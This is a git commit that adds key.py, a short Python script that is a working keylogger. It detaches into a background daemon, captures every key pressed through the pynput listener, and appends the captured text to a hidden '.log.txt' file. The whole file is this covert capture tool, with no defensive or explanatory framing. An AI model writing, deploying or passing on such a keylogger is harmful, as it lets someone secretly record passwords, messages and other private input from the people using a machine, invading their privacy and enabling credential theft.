5a5de2314a4ac51345cfa47b5fb17beeab5e9fc6
André Augusto Giannotti Scotá <andre.scota@gmail.com>
2020-04-25 01:50:15 -0300

    Add files via upload

---
+++ key.py
@@ -0,0 +1,37 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+# Andre Augusto Giannotti Scota (https://sites.google.com/view/a2gs/)
+
+from os import fork, umask, setsid, chdir
+from sys import exit
+from pynput.keyboard import Key, Listener
+
+kbuf = ""
+
+def d():
+	if fork() > 0:
+		exit(0)
+
+	chdir('./')
+	setsid()
+	umask(0)
+
+def kp(k):
+	global kbuf
+
+	if k == Key.enter or k == Key.tab or k == Key.space:
+		wl(kbuf)
+		kbuf = ""
+
+	kbuf += str(k)
+
+def wl(k):
+	f = open('.log.txt', 'a')
+	f.write(k)
+	f.close()
+
+d()
+
+with Listener(on_press = kp) as listener:
+	listener.join()
